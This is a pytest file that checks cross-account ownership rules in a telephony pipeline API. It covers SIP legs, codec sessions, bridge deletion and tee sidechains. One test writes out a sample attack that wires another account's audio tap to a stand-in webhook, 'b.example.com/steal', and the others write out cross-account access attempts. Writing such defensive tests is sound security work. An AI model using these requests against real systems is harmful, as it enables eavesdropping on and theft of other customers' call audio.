"""Account A must not be able to wire account B's resources.

Attack vectors verified:

* ``sip:OTHER_LEG`` in a POST DSL — referencing another account's leg.
* ``codec:OTHER_SESSION`` — referencing another account's webclient slot.
* ``bridge:OTHER_LEG`` in a DELETE — tearing down another account's bridge.
* tee sidechain (``tee:OTHER_TAP``) — attaching to another account's tap.

The ownership check today covers only ``call:``/``conference:``.  These
tests pin the expected contract for every other endpoint-type so
further regressions are caught early.
"""
from __future__ import annotations

import json

import pytest

from conftest import (
    ACCOUNT_TOKEN, SUBSCRIBER_ID,
    ACCOUNT2_TOKEN, SUBSCRIBER2_ID,
)
from speech_pipeline.telephony import (
    call_state, leg as leg_mod, subscriber as sub_mod,
)


def _mk_leg(subscriber_id: str, call_id: str) -> leg_mod.Leg:
    from unittest.mock import MagicMock
    fake = MagicMock(); fake.RTPClients = []
    leg = leg_mod.create_leg(
        direction="outbound", number="+49", pbx_id="TestPBX",
        subscriber_id=subscriber_id, voip_call=fake,
    )
    leg.call_id = call_id
    leg.callbacks = {"completed": "/cb"}
    return leg


class TestSipLegOwnership:

    def test_account_cannot_reference_other_accounts_sip_leg(
            self, client, account, account2):
        # A's call + leg.
        call_a = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER_ID}),
                             headers=account).get_json()["call_id"]
        leg_a = _mk_leg(SUBSCRIBER_ID, call_a)
        # B's call.
        call_b = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER2_ID}),
                             headers=account2).get_json()["call_id"]

        try:
            # B tries to wire A's leg into B's call.
            resp = client.post("/api/pipelines",
                               data=json.dumps({
                                   "dsl": f"sip:{leg_a.leg_id} "
                                          f"-> call:{call_b} "
                                          f"-> sip:{leg_a.leg_id}",
                               }),
                               headers=account2)
            assert resp.status_code in (403, 404), (
                f"Account 2 was allowed to reference account 1's SIP "
                f"leg {leg_a.leg_id!r}: "
                f"{resp.status_code} {resp.get_data(as_text=True)}"
            )
        finally:
            leg_mod._legs.pop(leg_a.leg_id, None)
            client.delete(f"/api/calls/{call_a}", headers=account)
            client.delete(f"/api/calls/{call_b}", headers=account2)


class TestBridgeDeleteOwnership:

    def test_account_cannot_delete_other_accounts_bridge(
            self, client, account, account2):
        call_a = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER_ID}),
                             headers=account).get_json()["call_id"]
        leg_a = _mk_leg(SUBSCRIBER_ID, call_a)
        try:
            # B issues a bridge-DELETE against A's leg id.
            resp = client.delete("/api/pipelines",
                                 data=json.dumps({
                                     "dsl": f"bridge:{leg_a.leg_id}",
                                 }),
                                 headers=account2)
            assert resp.status_code in (403, 404), (
                f"Account 2 was able to DELETE bridge on account 1's "
                f"leg: {resp.status_code}"
            )
        finally:
            leg_mod._legs.pop(leg_a.leg_id, None)
            client.delete(f"/api/calls/{call_a}", headers=account)


class TestCodecSessionOwnership:
    """Webclient codec sessions are call-scoped.  Referencing another
    account's session id in a POST DSL must be rejected the same way
    as ``sip:``."""

    def test_account_cannot_reference_other_accounts_codec_session(
            self, client, account, account2, admin):
        # Account 2 needs webclient feature to drive its own pipeline.
        client.put("/api/accounts/test-account2",
                   data=json.dumps({"token": ACCOUNT2_TOKEN,
                                     "pbx": "TestPBX2",
                                     "features": ["webclient"]}),
                   headers=admin)
        # Account 1 (no webclient feature yet) — grant for this test.
        client.put("/api/accounts/test-account",
                   data=json.dumps({"token": ACCOUNT_TOKEN,
                                     "pbx": "TestPBX",
                                     "features": ["webclient"]}),
                   headers=admin)

        call_a = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER_ID}),
                             headers=account).get_json()["call_id"]
        call_b = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER2_ID}),
                             headers=account2).get_json()["call_id"]

        try:
            # A creates a webclient slot (owns the session id).
            sess_a = client.post("/api/pipelines",
                                  data=json.dumps({"dsl":
                                      'webclient:user_a' + json.dumps({
                                          "callback": "/cb",
                                          "base_url": "https://x.test",
                                          "call_id": call_a,
                                      })}),
                                  headers=account).get_json()["session_id"]

            # B tries to wire A's codec session into B's call.
            resp = client.post("/api/pipelines",
                               data=json.dumps({
                                   "dsl": f"codec:{sess_a} "
                                          f"-> call:{call_b} "
                                          f"-> codec:{sess_a}",
                               }),
                               headers=account2)
            assert resp.status_code in (403, 404), (
                f"Account 2 got codec:{sess_a} wired into its own "
                f"call: {resp.status_code} "
                f"{resp.get_data(as_text=True)}"
            )
        finally:
            client.delete(f"/api/calls/{call_a}", headers=account)
            client.delete(f"/api/calls/{call_b}", headers=account2)


class TestTeeSidechainOwnership:
    """Tee sidechain attach: ``tee:OTHER_TAP -> stt:de -> webhook:URL``
    — the tap belongs to another account's call.  Must be rejected."""

    def test_cross_account_tee_attach_rejected(
            self, client, account, account2):
        call_a = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER_ID}),
                             headers=account).get_json()["call_id"]
        call_b = client.post("/api/calls",
                             data=json.dumps({"subscriber_id": SUBSCRIBER2_ID}),
                             headers=account2).get_json()["call_id"]
        try:
            # A creates a tee via play->tee->call pipe.
            client.post("/api/pipelines",
                        data=json.dumps({
                            "dsl": f'play:src_a{{"url":"examples/queue.mp3",'
                                   f'"loop":true}} '
                                   f'-> tee:tap_a -> call:{call_a}',
                        }),
                        headers=account)

            # B attempts to attach a sidechain to A's tee.  With
            # no call: element, ownership falls back to the owning
            # tee — which is A's.
            resp = client.post("/api/pipelines",
                               data=json.dumps({
                                   "dsl": "tee:tap_a -> webhook:"
                                          "https://b.example.com/steal",
                               }),
                               headers=account2)
            assert resp.status_code in (403, 404), (
                f"Account 2 attached a sidechain to account 1's tee: "
                f"{resp.status_code} {resp.get_data(as_text=True)}"
            )
        finally:
            client.delete(f"/api/calls/{call_a}", headers=account)
            client.delete(f"/api/calls/{call_b}", headers=account2)
